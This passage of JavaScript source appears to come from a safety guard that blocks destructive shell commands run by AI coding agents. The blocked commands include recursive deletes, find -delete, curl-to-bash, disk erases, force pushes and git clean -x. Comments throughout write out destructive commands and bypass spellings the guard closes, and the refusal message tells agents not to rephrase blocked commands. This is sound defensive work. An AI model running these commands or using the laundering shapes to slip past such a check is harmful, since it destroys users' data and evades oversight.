      if (end === -1) { i += 1; continue; }
      i = end + 2;
      continue;
    }
    if (pattern[i] === "]") return i;
    i += 1;
  }
  return -1;
}

/** Remove every bracket expression from a GLOB. An unterminated `[` is a literal in glob, so it is
 *  kept rather than swallowing the rest of the pattern. */
function stripBracketClasses(pattern) {
  let out = "";
  for (let i = 0; i < pattern.length; ) {
    if (pattern[i] === "[") {
      const end = bracketClassEnd(pattern, i);
      if (end !== -1) { i = end + 1; continue; }
    }
    out += pattern[i];
    i += 1;
  }
  return out;
}

/** The same question for a REGEX, where "contains a literal" does not survive contact with
 *  quantifiers: in `-regex '.*x*'` the `x` is quantified away, so the pattern is `.*` wearing a
 *  literal and matches every path on the system. `x{0,9}.*` and `.*(x)?` are the same trick.
 *  So a regex atom counts only if it is REQUIRED — i.e. not followed by `*`, `?`, or an interval
 *  whose lower bound is zero — and every top-level `|` branch must carry one, for the same reason
 *  every top-level `-o` branch must (one branch matching everything is enough).
 *
 *  A bracket class (`[a-z]`) constrains a position without naming a literal, so it does not count;
 *  a group counts when its own contents do, recursively. Both sides of that are the safe side. */
function regexNamesSomething(pattern) {
  pattern = normalizeRegexDialect(pattern);
  const branches = splitTopLevel(pattern, "|");
  if (branches.length > 1) return branches.every(regexNamesSomething);
  for (let i = 0; i < pattern.length; ) {
    let atom, inner = null;
    const c = pattern[i];
    if (c === "\\") { atom = pattern.slice(i, i + 2); i += 2; }
    else if (c === "(") {
      const end = matchingParen(pattern, i);
      if (end === -1) return false; // unbalanced — cannot reason about it, so refuse
      inner = pattern.slice(i + 1, end);
      atom = pattern.slice(i, end + 1);
      i = end + 1;
    } else if (c === "[") {
      // Same rule as the glob path, from the same function — a leading `]` is a member, not the close.
      const end = bracketClassEnd(pattern, i);
      if (end === -1) return false; // unterminated — cannot reason about it, so refuse
      atom = pattern.slice(i, end + 1);
      inner = null;
      i = end + 1;
    } else { atom = c; i += 1; }
    let quant = "";
    if (pattern[i] === "*" || pattern[i] === "?" || pattern[i] === "+") { quant = pattern[i]; i += 1; }
    else if (pattern[i] === "{") {
      const end = pattern.indexOf("}", i);
      if (end !== -1) { quant = pattern.slice(i, end + 1); i = end + 1; }
    }
    if (quant === "*" || quant === "?" || /^\{\s*0\s*[,}]/.test(quant)) continue; // optional
    if (atom.startsWith("[")) continue; // a class binds a position, not a name
    if (inner !== null) { if (regexNamesSomething(inner)) return true; continue; }
    if (/[A-Za-z0-9_]/.test(atom.replace(/\\./g, ""))) return true;
  }
  return false;
}

/** `-regex` IS NOT EXTENDED REGEX, in either dialect that runs here. GNU find defaults to
 *  `-regextype emacs` and BSD/macOS find to BRE — that is what `-E` opts OUT of — and in both,
 *  alternation is `\|`, groups are `\(…\)` and intervals are `\{n,m\}`. So a reader written against
 *  ERE consumes the backslash form as a two-character LITERAL, never sees the quantifier, and counts
 *  the first bare character as a required name. That leaves the dangerous spelling of exactly the
 *  bypass this rule targets wide open, on macOS's own `/usr/bin/find`:
 *
 *      find / -regex 'x\{0,9\}.*' -delete     ← BRE interval: matches every path
 *      find / -regex '\(x\)*.*' -delete       ← BRE group + `*`
 *      find / -regex 'zzz\|.*' -delete        ← emacs alternation
 *
 *  Both spellings are therefore read as OPERATORS. In ERE that is a mis-parse — `\(` there is a
 *  literal paren — but it errs by treating a literal as a group, i.e. by finding LESS that is
 *  required, i.e. by refusing. That is the direction to be wrong in, and it means one reader covers
 *  `find`, `find -E` and `-regextype posix-extended` without knowing which one it is looking at. */
function normalizeRegexDialect(pattern) {
  return pattern.replace(/\\([(){}|?+])/g, "$1");
}

/** Split a regex on a top-level (paren-depth-0, unescaped) separator. */
function splitTopLevel(pattern, sep) {
  const out = [];
  let depth = 0;
  let start = 0;
  for (let i = 0; i < pattern.length; i++) {
    const c = pattern[i];
    if (c === "\\") { i++; continue; }
    if (c === "(") depth++;
    else if (c === ")") depth = Math.max(0, depth - 1);
    else if (c === sep && depth === 0) { out.push(pattern.slice(start, i)); start = i + 1; }
  }
  out.push(pattern.slice(start));
  return out;
}

function matchingParen(pattern, open) {
  let depth = 0;
  for (let i = open; i < pattern.length; i++) {
    const c = pattern[i];
    if (c === "\\") { i++; continue; }
    if (c === "(") depth++;
    else if (c === ")" && --depth === 0) return i;
  }
  return -1;
}

function namesSomething(pattern, predicate) {
  return predicate === "-regex" || predicate === "-iregex"
    ? regexNamesSomething(pattern)
    : globNamesSomething(pattern);
}

const FIND_OR = new Set(["-o", "-or"]);
/** find's COMMA is a real operator and the loosest-binding one there is: `expr1 , expr2` evaluates
 *  both and takes the value of the RIGHT one. So `find / \( -name zzz , -true \) -delete` is always
 *  true and deletes every file on the system while containing a perfectly good `-name`. A reader that
 *  models `(`, `!`, `-a` and `-o` but not `,` reports that as narrowed. */
const FIND_COMMA = new Set([","]);
const FIND_NOT = new Set(["!", "-not"]);
const FIND_OPEN = new Set(["(", "\\("]);
const FIND_CLOSE = new Set([")", "\\)"]);
/** These carry a COMMAND, whose own words are not find's operators — `-exec grep -o pat {} +` must
 *  not be read as an OR. The run ends at the `;`/`+` terminator find requires. */
const FIND_COMMAND_PREDICATES = new Set(["-exec", "-execdir", "-ok", "-okdir"]);

/** Index just past a `-exec`-family run (its terminator included), starting AT the predicate. */
function findSkipCommandRun(args, i) {
  let j = i + 1;
  while (j < args.length && args[j] !== ";" && args[j] !== "\\;" && args[j] !== "+") j++;
  return Math.min(j + 1, args.length);
}

/** Index just past the operand that begins at `i` — used to step OVER a negated operand, which
 *  contributes no narrowing of its own. */
function findSkipOperand(args, i) {
  if (i >= args.length) return args.length;
  if (FIND_NOT.has(args[i])) return findSkipOperand(args, i + 1);
  if (FIND_OPEN.has(args[i])) {
    const end = findMatchingClose(args, i);
    return end === -1 ? args.length : end + 1;
  }
  if (FIND_COMMAND_PREDICATES.has(args[i])) return findSkipCommandRun(args, i);
  if (NAMING_PREDICATES.has(args[i])) return i + 2; // predicate + its pattern
  return i + 1;
}

function findMatchingClose(args, open) {
  let depth = 0;
  for (let i = open; i < args.length; i++) {
    if (FIND_OPEN.has(args[i])) depth++;
    else if (FIND_COMMAND_PREDICATES.has(args[i])) { i = findSkipCommandRun(args, i) - 1; }
    else if (NAMING_PREDICATES.has(args[i])) i++; // its PATTERN is data, not an operator
    else if (FIND_CLOSE.has(args[i]) && --depth === 0) return i;
  }
  return -1;
}

/** Split an expression on a top-level operator token. `-o`/`-or` for the OR case; `,` for the comma
 *  case, which binds even looser. Groups, `-exec` tails and naming patterns are all stepped over so
 *  a token inside them is never mistaken for an operator. */
function findSplitOn(args, ops) {
  const out = [];
  let depth = 0;
  let start = 0;
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (FIND_OPEN.has(a)) depth++;
    else if (FIND_CLOSE.has(a)) depth = Math.max(0, depth - 1);
    else if (FIND_COMMAND_PREDICATES.has(a)) { i = findSkipCommandRun(args, i) - 1; }
    else if (NAMING_PREDICATES.has(a)) i++; // its PATTERN is data, not an operator
    else if (ops.has(a) && depth === 0) { out.push(args.slice(start, i)); start = i + 1; }
  }
  out.push(args.slice(start));
  return out;
}

/** Does this `find` narrow what it matches to something the author NAMED?
 *
 *  This is STRUCTURAL rather than a membership test, and the difference is a whole class of false
 *  refusals. A flat "does any arg defeat narrowing" scan cannot tell
 *
 *      find / \( -name zzz -o -true \) -delete        ← matches every file
 *
 *  from the two commonest bounded-cleanup idioms there are:
 *
 *      find "$HOME" \( -name '*.log' -o -name '*.tmp' \) -delete
 *      find "$HOME" -name '*.pyc' -not -path './venv/*' -delete
 *
 *  Treating any `-o`/`-not` as a defeat refused both, with no approval path — the same over-block
 *  this rule's own comments call out for `-type` and for gating on the root alone. The structure is
 *  what separates them:
 *
 *    • OR is a UNION, so EVERY top-level branch must narrow. One branch that names nothing
 *      (`-true`, a bare `-type f`, an action) re-admits everything the others excluded.
 *    • AND is an INTERSECTION, so ANY conjunct that narrows bounds the whole. That is why a
 *      negation beside a real name is harmless: `-not -path x` only SUBTRACTS from the set `-name`
 *      already bounded.
 *    • A negation on its own narrows nothing — `! -name zzz` is everything-but-one-thing — so its
 *      operand is stepped over rather than counted.
 *
 *  `-true`/`-false` need no special case under those rules: they contribute nothing, so they fail
 *  an OR branch (correct — `-name x -o -true` is everything) and are harmless in an AND
 *  (`-name x -a -true` really is bounded by `-name x`). An expression this cannot parse
 *  (unbalanced parens) reports NOT narrowed, which is the refusing side.
 *
 *  Precedence order matters and is followed: `,` (loosest) then `-o` then the implicit `-a`. */
function findHasNarrowingPredicate(args) {
  // EVERY comma segment must narrow. Reading only the LAST one — because the comma's VALUE is its
  // right operand — was a bypass of its own: `,` evaluates BOTH operands and merely discards the
  // left one's VALUE, so the left segment's ACTIONS still run on every file.
  //
  //     find / -delete , -name zzz              ← -delete runs over / ; last segment names something
  //     find / -false -o -delete , -name zzz    ← and this one the flat `-o` scan used to block
  //
  // Each segment's own tests are the only thing bounding an action inside it, so all of them have to
  // bound. This does over-refuse a harmless left segment (`find / -print , -name zzz -delete`) —
  // the refusing side, and the price of not modelling which predicates are actions.
  const commaSegments = findSplitOn(args, FIND_COMMA);
  if (commaSegments.length > 1) return commaSegments.every(findHasNarrowingPredicate);
  const branches = findSplitOn(args, FIND_OR);
  if (branches.length > 1) return branches.every(findHasNarrowingPredicate);
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (FIND_NOT.has(a)) { i = findSkipOperand(args, i + 1) - 1; continue; }
    if (FIND_OPEN.has(a)) {
      const end = findMatchingClose(args, i);
      if (end === -1) return false;
      if (findHasNarrowingPredicate(args.slice(i + 1, end))) return true;
      i = end;
      continue;
    }
    if (FIND_COMMAND_PREDICATES.has(a)) { i = findSkipCommandRun(args, i) - 1; continue; }
    if (!NAMING_PREDICATES.has(a)) continue;
    const pattern = args[i + 1];
    i++;
    if (pattern === undefined) continue;
    if (!namesSomething(pattern, a)) continue; // names everything = names nothing
    return true;
  }
  return false;
}

/** Does this line open a heredoc, and with what terminator? `null` if not.
 *
 *  Scans rather than pattern-matches, for two reasons a regex got wrong. (1) A regex retries at the
 *  next character, so `<<<'foo'` matches at the SECOND `<` and is read as a heredoc named `foo` —
 *  which then swallows every following line, including a real `rm -rf /`. (2) A regex is not
 *  quoting-aware, so `echo "see <<EOF"` — which merely MENTIONS the operator — opened a body too.
 *  Tracking quote state and requiring exactly two `<` outside quotes fixes both. */
function heredocOpenedBy(line, quoteIn = null) {
  let quote = quoteIn;
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (quote !== null) {
      if (c === "\\" && quote === '"' && i + 1 < line.length) i++;
      else if (c === quote) quote = null;
      continue;
    }
    if (c === "\\") { i++; continue; }
    if (c === "'" || c === '"') { quote = c; continue; }
    if (c !== "<") continue;
    // Exactly two: not `<` (a redirect) and not `<<<` (a here-string).
    if (line[i + 1] !== "<") continue;
    if (line[i + 2] === "<") { i += 2; continue; }
    let j = i + 2;
    let allowIndent = false;
    if (line[j] === "-") { allowIndent = true; j++; }
    while (line[j] === " " || line[j] === "\t") j++;
    const q = line[j];
    if (q === "'" || q === '"') {
      const end = line.indexOf(q, j + 1);
      if (end === -1) return { terminator: null, allowIndent, quoteOut: quote };
      return { terminator: line.slice(j + 1, end), allowIndent, quoteOut: quote };
    }
    const m = /^[A-Za-z_][A-Za-z0-9_]*/.exec(line.slice(j));
    return { terminator: m ? m[0] : null, allowIndent, quoteOut: quote };
  }
  // No heredoc opened on this line; report the quote state it ENDS in so the caller can carry it
  // to the next one. A quote opened here and closed two lines down means the line between is
  // inside a string — and treating each line as freshly unquoted let a `<<WORD` in that string
  // open a body, discarding every following line before the lexer saw it.
  return { terminator: null, allowIndent: false, quoteOut: quote };
}

/** Remove HEREDOC BODIES before lexing. A heredoc body is DATA being written, not commands being
 *  run — the same distinction as `echo 'do not run: rm -rf /'`, which this guard already respects,
 *  except the lexer cannot see it because the body is separated by newlines rather than quotes.
 *
 *  This was found the hard way: a `python3 - file <<'PY' … PY` invocation whose script text quoted
 *  `git push --force origin main` as a STRING TO PATCH INTO A FILE was refused by this guard, with
 *  no approval path. That is not an edge case — writing a script, a test, or a doc that mentions a
 *  destructive command is ordinary work, and this repo's own fixture is full of such text.
 *
 *  Handles `<<WORD`, `<<-WORD`, `<<'WORD'` and `<<"WORD"`; `<<-` allows a tab-indented terminator.
 *  A body with no terminator (an unterminated heredoc) runs to the end of the string, which is what
 *  the shell would do too. `<<<` (a here-STRING) is deliberately untouched: it is a single word on
 *  the same line, already handled by the lexer's quoting. */
function stripHeredocBodies(command) {
  if (!command.includes("<<")) return command;
  const lines = command.split("\n");
  const out = [];
  let terminator = null;
  let allowIndent = false;
  let quote = null; // carried ACROSS lines — a shell string may span them
  for (const line of lines) {
    if (terminator !== null) {
      const candidate = allowIndent ? line.replace(/^[\t ]+/, "") : line;
      if (candidate === terminator) terminator = null;
      continue; // the body (and its terminator) are data
    }
    const opened = heredocOpenedBy(line, quote);
    quote = opened.quoteOut;
    if (opened.terminator !== null) {
      allowIndent = opened.allowIndent;
      terminator = opened.terminator;
    }
    out.push(line);
  }
  return out.join("\n");
}

/** How deep to follow a command nested inside another (`bash -c "xargs rm -rf ~"`). A cap, not a
 *  policy: the shapes below are one or two levels in practice, and an unbounded walk on attacker-
 *  shaped input is how a guard that must never hang starts hanging. */
const MAX_NESTING = 3;

/** Binaries whose trailing operands are themselves a command to run. */
const NESTING_WRAPPERS = new Set(["xargs", "time", "nohup", "env", "nice", "stdbuf"]);

/** THE DESTRUCTIVE-COMMAND PREDICATE. Returns null to allow, or `{ rule, why }` to block.
 *
 *  Segment-wise and command-position anchored (see the section header). Pure: it consults no
 *  filesystem and no repo, so it always decides from the command string alone and can never fire
 *  because some unrelated probe failed.
 *
 *  It also follows a command NESTED inside another, because the section header's claim — that
 *  laundering a destructive command past this does not work — is otherwise false in three shapes
 *  the top-level lexer cannot see: a shell's `-c` argument is ONE token and never re-lexed
 *  (`bash -c "rm -rf ~"`), and `xargs` / `find -exec` carry their command as plain operands, so the
 *  segment's command word is `xargs`/`find` and the `rm` is invisible. */
export function blocksDestructiveCommand(command, depth = 0) {
  if (typeof command !== "string" || command.length === 0) return null;
  if (depth > MAX_NESTING) return null;
  if (depth === 0) envReadingsLeft = ENV_READING_BUDGET; // per top-level command, so nesting cannot multiply past it
  let sawDownloader = false;
  for (const tokens of lexCommand(stripHeredocBodies(command))) {
    const seg = segmentCommand(tokens);
    if (!seg) continue;
    const { bin, args } = seg;

    const verdict = judgeSegment(tokens, depth);
    if (verdict) return verdict;

    // Pipe-to-shell is the ONE rule that cannot live in `judgeSegment`: it is the only cross-segment
    // rule, needing to know that an earlier segment on this line fetched something.
    //
    // `lexCommand` splits on `|`, `&&`, `;` and `(` alike and does not report WHICH separator it
    // saw, so co-occurrence is all this can see directly — and co-occurrence ALONE over-blocks
    // badly: `curl -s localhost:3000/health && bash scripts/tests/run.sh` is ordinary work, and
    // under bypassPermissions a refusal here has no approval path.
    //
    // The discriminator is the shell segment's OPERANDS. `curl … | bash` invokes a shell with no
    // script to run, so its input can only be the pipe; `bash scripts/x.sh` names a local file that
    // is on disk and reviewable. So: downloader earlier in the line AND a shell later with no file
    // operand. `curl … | jq .name` is unaffected either way — jq is not a shell.
    if (DOWNLOADER_BINARIES.has(bin)) sawDownloader = true;
    else if (
      sawDownloader &&
      SHELL_BINARIES.has(bin) &&
      // A `/dev/stdin`-style operand is the pipe wearing a filename, so it does not count as the
      // reviewable script file that makes this allowed.
      operandsOf(args).filter((a) => !isStdinOperand(a)).length === 0
    ) {
      return { rule: "pipe-to-shell", why: "executing unreviewed remote code; download it, read it, then run it" };
    }
  }
  return null;
}

/** Every single-segment rule, judged from TOKENS rather than a string.
 *
 *  Taking tokens is what makes the nested cases correct: `xargs` and `find -exec` already hand us
 *  separated words, and re-joining them into a line so the lexer could re-split it is a round trip
 *  through quoting rules that this file's lexer does not fully implement (it treats a backslash
 *  inside single quotes literally, as the shell does — so the classic `'\''` escape would not
 *  survive). Tokens in, tokens judged. */
function judgeSegment(tokens, depth) {
  if (depth > MAX_NESTING) return null;
  const seg = segmentCommand(tokens);
  if (!seg) return null;
  {
    const { bin, args } = seg;

    // ── NESTED COMMANDS ──────────────────────────────────────────────────────────────────────
    // Without these, the section header's claim that laundering does not work is simply false:
    // a shell's `-c` argument is ONE token the top-level lexer never re-lexes, and `xargs` /
    // `find -exec` carry their command as plain operands, so the segment's command word is
    // `xargs`/`find` and the `rm` behind it is invisible.
    if (SHELL_BINARIES.has(bin)) {
      // `-c` may be BUNDLED (`bash -lc "…"`, `sh -ec '…'`), and `-lc` is the idiom this repo's own
      // tooling uses — an exact `indexOf("-c")` misses every one of them.
      const at = args.findIndex(
        (a) => a.startsWith("-") && !a.startsWith("--") && a.includes("c"),
      );
      if (at !== -1 && args[at + 1] !== undefined) {
        // A `-c` operand IS a command string, so this one is re-lexed on purpose.
        const nested = blocksDestructiveCommand(args[at + 1], depth + 1);
        if (nested) return nested;
      }
    }
    if (bin === "env") {
      // `env` gets the REAL option grammar, not `commandTailFrom`'s exact-token flag set — the same
      // reader `find -exec` uses. Using the weak one here left `env -S 'rm -rf /'` allowed at top
      // level long after the `find -exec` spelling of it was closed.
      const parsed = envParse(args);
      if (parsed.kind === "split") {
        // `-S` carries a whole COMMAND LINE, so it goes through the FULL judge: pipe-to-shell is a
        // CROSS-SEGMENT rule living only in `blocksDestructiveCommand`. This used to run only when
        // no operands followed, so appending one harmless word skipped it —
        // `env -S 'curl … | bash' x` was allowed while the same string without the `x` blocked.
        if (envReadingsLeft-- <= 0) return ENV_BUDGET_VERDICT;
        const whole = blocksDestructiveCommand(parsed.str, depth + 1);
        if (whole) return whole;
        // Only the readings that judge did NOT already cover: the last segment with the trailing
        // operands attached, plus the alternative option-arity readings. Re-walking every segment
        // here would duplicate the full judge's work and burn the budget at ~2x on `-S` shapes.
        const segs = lexCommand(stripHeredocBodies(parsed.str));
        const last = segs.length ? [...segs[segs.length - 1], ...parsed.rest] : parsed.rest;
        for (const toks of envDedupeReadings([last, ...[...(parsed.alts ?? [])].reverse()])) {
          if (envReadingsLeft-- <= 0) return ENV_BUDGET_VERDICT;
          const nested = judgeSegment(toks, depth + 1);
          if (nested) return nested;
        }
      } else {
        for (const toks of envRunTokenLists(args)) {
          if (envReadingsLeft-- <= 0) return ENV_BUDGET_VERDICT;
          const nested = judgeSegment(toks, depth + 1);
          if (nested) return nested;
        }
      }
    } else if (NESTING_WRAPPERS.has(bin)) {
      const nested = judgeSegment(commandTailFrom(args, WRAPPER_VALUE_FLAGS[bin]), depth + 1);
      if (nested) return nested;
    }
    if (bin === "find") {
      const execTails = findExecTails(args);
      for (const tail of execTails) {
        const nested = judgeSegment(tail, depth + 1);
        if (nested) return nested;
      }
      // `find <root> -exec rm -rf {} +` names `{}` as the target, so the nested judgement above
      // (correctly) sees nothing catastrophic — `find . -name '*.log' -exec rm -rf {} +` is
      // ordinary cleanup. What decides it is where find was pointed AND how wide it casts.
      //
      // TWO conditions, because the root alone over-approximates: the root is where find SEARCHES,
      // not what it DELETES. `find ~/Projects -name node_modules -type d -exec rm -rf {} +` is
      // exactly the cleanup an agent should be able to run, and gating on the root alone refused
      // it — a false refusal with no approval path. So this fires only when the deletion set is
      // genuinely unbounded: a top-level root (`/`, `~`, `$HOME`, a home directory itself — depth
      // 0, not one level below) AND no narrowing predicate to bound what matches.
      // `-r` is NOT what makes the `-exec` destructive here, and requiring it left the widest
      // shape of all open: `find / -type f -exec rm {} +` returned ALLOW while its `-rf` sibling
      // was refused. A plain `rm` removes every FILE it is handed — recursion only buys the
      // ability to descend into DIRECTORIES, and find has already done the descending, so the
      // deletion set is identical. `-type f` even makes the plain form the *natural* spelling.
      //
      // Which binary counts, and how a tail is normalized before that question is asked, both live
      // in `execTailDeleter` — so a laundered spelling (`env rm`, `sh -c 'rm "$@"'`) and a sibling
      // primitive (`shred -u`, `truncate -s0`) are judged the same as the plain one, and ANY of the
      // clauses may be the deleting one.
      //
      // None of this can over-refuse, because the two conditions below are untouched: it still
      // fires only on a depth-0 root AND when nothing narrows the match, so an ordinary scoped
      // cleanup (`find build -type f -exec rm {} +`, or any real `-name`) is unaffected.
      const deleter = execTails.map((t) => execTailDeleter(t)).find(Boolean) ?? null;
      const deletes = args.includes("-delete") || deleter !== null;
      if (deletes && !findHasNarrowingPredicate(args)) {
        const root = findSearchRoots(args).find(isTopLevelRoot);
        if (root) {
          return {
            rule: args.includes("-delete") ? "find -delete" : `find -exec ${deleter ?? "rm"}`,
            why: `an unbounded delete rooted at ${root} — nothing narrows what it matches`,
          };
        }
      }
    }

    if (ALWAYS_BLOCKED_BINARIES.has(bin)) {
      return { rule: bin, why: `\`${bin}\` is never an agent's call` };
    }
    if (bin.startsWith("mkfs")) {
      return { rule: "mkfs", why: "formatting a filesystem destroys everything on it" };
    }
    if (bin === "diskutil") {
      // `diskutil [quiet] verb [subVerb] …` — so drop a leading literal `quiet` before reading the
      // verb pair, and compare lowercased: both are real invocations of the same command, and an
      // enumeration that misses either is a hole where a blanket rule had none. `diskutil list` /
      // `info` / `apfs list` are read-only and must fall through.
      const words = operandsOf(args).map((w) => w.toLowerCase());
      if (words[0] === "quiet") words.shift();
      const [verb = "", apfsVerb = ""] = words;
      if (DISKUTIL_DESTRUCTIVE.has(verb) || (verb === "apfs" && DISKUTIL_APFS_DESTRUCTIVE.has(apfsVerb))) {
        return {
          rule: `diskutil ${verb}${verb === "apfs" ? ` ${apfsVerb}` : ""}`,
          why: "erasing or repartitioning a volume destroys everything on it",
        };
      }
    }
    if (bin === "rm") {
      const target = rmCatastrophicTarget(args);
      if (target) {
        return { rule: "rm -r", why: `recursive removal of ${target}, which is outside this agent's lane` };
      }
    }
    if (bin === "dd" && args.some((a) => /^of=\/dev\//.test(a))) {
      return { rule: "dd", why: "a raw write to a device node destroys the disk" };
    }
    if (bin === "bd" && subcommandOf(args) === "delete") {
      return {
        rule: "bd delete",
        why: "AGENTS.md: `bd delete` is unrecoverable on a shared store — use `bd close` instead",
      };
    }
    if (PUBLISHERS.has(bin) && subcommandOf(args) === "publish") {
      return { rule: `${bin} publish`, why: "an outward-facing publish is never an agent's call" };
    }
    if (bin === "git") {
      const git = gitInvocation(tokens);
      if (git) {
        if (git.sub === "push") {
          const why = gitPushViolation(git.args);
          if (why) return { rule: "git push", why };
        }
        if (git.sub === "branch") {
          const forceDelete = git.args.some((a) => a === "-D" || (a.startsWith("-") && !a.startsWith("--") && a.includes("D")));
          if (forceDelete && git.args.some((a) => DEFAULT_BRANCHES.has(a))) {
            return { rule: "git branch -D", why: "force-deleting the default branch" };
          }
        }
        if (git.sub === "clean") {
          // `-x` and `-X` are the flags that remove IGNORED files — i.e. .env and credentials.
          // `git clean -fd` leaves them alone and stays allowed.
          //
          // BOTH CASES, because they are not variants of one flag: `-x` adds ignored files to the
          // untracked sweep, while `-X` removes ONLY the ignored ones. `-X` is therefore strictly
          // worse here — it deletes the credentials and nothing else — and a case-sensitive test
          // read straight past it.
          //
          // Scanning stops at `e`, because `-e` takes a VALUE and may carry it attached: in
          // `git clean -e'*.x'` the lexer yields the single token `-e*.x`, whose "x" belongs to the
          // user's exclude PATTERN, not to a flag. A plain `.includes("x")` refuses that — a false
          // refusal with no approval path, which is the thing this whole posture exists to remove.
          // Adding `X` widens what the cluster test matches, so this stop matters MORE, not less:
          // an uppercase pattern (`-fde'*.XZ'`) is an ordinary clean and must stay allowed.
          //
          // LONG OPTIONS ARE SKIPPED BECAUSE GIT CANNOT EXPRESS THIS FLAG AS ONE — not as an
          // oversight. git-clean's synopsis is `[-d] [-f] [-i] [-n] [-q] [-e <pattern>] [-x | -X]`
          // and its only long forms are --force, --interactive, --dry-run, --quiet and
          // --exclude=<pattern>; `--ignored`, `--ignored-only` and `--exclude-ignored` are all
          // rejected by git with "unknown option". There is no long spelling to catch, so do not
          // invent one. (Pinned by destructiveCommands.test.ts.)
          // NO DRY-RUN EXEMPTION. A `--dry-run` clean really does delete nothing, so exempting it
          // looks free — and it is not, because `-e`/`--exclude` take a value that may be DETACHED.
          // git's parse-options consumes the next argv unconditionally for a required-argument
          // option, without checking whether it looks like a flag, so in `git clean -fdx -e -n` the
          // exclude PATTERN is the literal string `-n` and git performs a REAL, destructive `-x`
          // clean. Any scan that reads that trailing `-n` as `--dry-run` waves it through. The same
          // holds for `-fdxe -n`, `--exclude -n` and `--exclude --dry-run`.
          //
          // That asymmetry is why this stays a pure `-x`/`-X` test: misreading a pathspec as a FLAG
          // is a harmless false refusal, but misreading a VALUE as `--dry-run` disables the guard.
          // Modelling git's option grammar well enough to tell them apart is a standing obligation
          // that grows with every flag git adds — on the one code path whose whole job is to stop a
          // credential deletion. A refused dry run costs one sentence to a human (the refusal
          // message says to ask rather than rephrase); a missed real clean costs the credentials.
          // KNOWN CURRENT BEHAVIOUR, deliberately NOT pinned in the corpus: with no flag/pathspec
          // boundary, a PATHSPEC literally named `-x`/`-X` is refused too (`git clean -fd -- -x`).
          // That is a harmless false refusal, identical to what shipped before, and a future `--`
          // boundary would — and should — allow it. It is recorded here rather than in
          // destructive-commands.json because `mustBlock` is a CONTRACT ("must be refused"), and
          // putting a harmless command there would make the correct future fix read as a
          // regression against it. See roborev 66282.
          // If the dry run is ever worth exempting it needs its own change, with the detached-value
          // case handled and pinned. `destructiveCommands.test.ts` pins all four bypass spellings.
          const removesIgnored = git.args.some((a) => {
            if (!a.startsWith("-") || a.startsWith("--")) return false;
            const cluster = a.slice(1);
            const valueAt = cluster.indexOf("e");
            const flags = valueAt === -1 ? cluster : cluster.slice(0, valueAt);
            return flags.includes("x") || flags.includes("X");
          });
          if (removesIgnored) {
            return {
              rule: "git clean -x",
              why: "`-x`/`-X` delete IGNORED files, which is where credentials live",
            };
          }
        }
      }
    }
  }
  return null;
}

/** The stderr text for a destructive-command refusal. Names the rule and what to do instead — a
 *  refusal that only states the rule sends an agent off to improvise something worse. */
function destructiveCommandMessage(verdict) {
  return (
    `Blocked: refusing to run this command — ${verdict.why}.\n` +
    `Rule: ${verdict.rule}. Sparkle's managed agents run with the approval prompt turned off, so ` +
    `this small set of unambiguously destructive commands is refused outright instead. The list is ` +
    `apps/desktop/shared/destructive-commands.json; if you believe this command belongs on the ` +
    `allowed side, say so rather than rephrasing it to get past the check.\n`
  );
}

// ──────────────────────────────────────────────────────────────────────────────────────────────
// MERGE-POLICY GUARD  (contract: PRD/sparkle/per-project-tool-policy-contract.md §7)
//
// `gh pr merge` was in NEITHER agent enforcement layer, so a build agent could merge a PR into a
// repo the machine's owner does not own, with nothing in the way.
//
// It must NOT join `SPARKLE_DENY_RULES` / the destructive-command corpus. A deny rule is a hard
// refusal with no approval path, and in `drodio/sparkle` merging is the SANCTIONED path — the
// orchestrator merges agent branches that way. A global rule would rebuild the exact wall this
// posture exists to tear down. So this is a PER-WORKTREE CONDITIONAL rule: the verdict is resolved
// in Rust (which owns the strictness lattice, the config and the repo slug) and written to
// `<worktree>/.sparkle/merge-policy.json`; the guard only reads it. Native `JSON.parse`, no new
// dependency, and deliberately no TOML parser — keeping the guard dependency-free is the whole
// reason the verdict is pre-resolved into JSON.
//
// THREE FILE STATES, and getting them backwards is the expensive mistake:
//
//   ABSENT      -> DO NOT BLOCK. Absence means "not a Sparkle-managed worktree; the guard has no
//                  opinion". This is only safe because the Rust writer emits the file
//                  UNCONDITIONALLY for every managed worktree, including unprotected ones
//                  (`mergeProtected: false`). Blocking on absence would break `gh pr merge` in
//                  every worktree that predates this change — including the sanctioned merge path
//                  in the owner's OWN repo, and the orchestrator's own PR merges.
//   UNREADABLE  -> BLOCK. Unparseable, wrong `version`, or no boolean `mergeProtected`. A policy
//                  file can only EXIST in a managed worktree, so a corrupted one is the tamper
//                  case and it fails closed.
//   PROTECTED   -> BLOCK.
//
// The check is cwd-anchored and walks UP for the policy file, because an agent's `cwd` is very
// often a subdirectory of its worktree rather than the root. It also resolves any `cd` target on
// the same command line: `cd ../other-repo && gh pr merge` is precisely the shape a prefix-matched
// deny rule cannot see, and it is why the lexer layer exists at all.

/** The one wire version this guard understands. A file claiming any other version is treated as
 *  unreadable (block) rather than ignored: a newer writer ships with a newer guard, so a version
 *  mismatch in the field means something rewrote the file. */
const MERGE_POLICY_VERSION = 1;
/** Ancestor directories to search for the policy file. A cap, not a policy — an unbounded walk on
 *  attacker-shaped input is how a guard that must never hang starts hanging. */
const MERGE_POLICY_MAX_ASCENT = 64;
/** Cap on policy-supplied prose echoed into the refusal, so a rewritten file cannot bury the
 *  guard's own fixed instructions under a wall of text. */
const MERGE_POLICY_TEXT_CAP = 400;

/** Read one candidate policy path. Distinguishes "not here, keep walking" from "here and
 *  unreadable" — the first is the ABSENT state (allow) and the second is the tamper state (block),
 *  and collapsing them is exactly the mistake this whole section is written around.
 *
 *  THE TAMPER STATE REQUIRES PROOF THAT THE FILE IS THERE, which is why this stats first. The walk
 *  climbs from `cwd` to `/`, so a read error says nothing about the policy unless the file exists:
 *  one mode-700 ancestor, an SMB mount answering `EIO`, or macOS TCC denying `~/Documents` yields
 *  `EACCES` for a path that holds no policy at all. Reading that as "PRESENT but unusable" ends the
 *  ascent, so the REAL policy higher up is never reached — and the refusal then names a file that
 *  does not exist and tells the agent not to delete it. Permanent, and unexplainable from the copy.
 *  So: `lstat` fails → missing, keep walking. `lstat` succeeds and the read fails → the file is
 *  demonstrably there and unreadable, which is the tamper case. */
function readMergePolicyFile(file) {
  try {
    lstatSync(file);
  } catch {
    return { ok: false, missing: true };
  }
  try {
    return { ok: true, text: readFileSync(file, "utf8") };
  } catch (e) {
    const code = e && typeof e === "object" ? e.code : undefined;
    // The one exception: a race in which the file is unlinked between the stat and the read is an
    // ABSENT file, not a corrupted one.
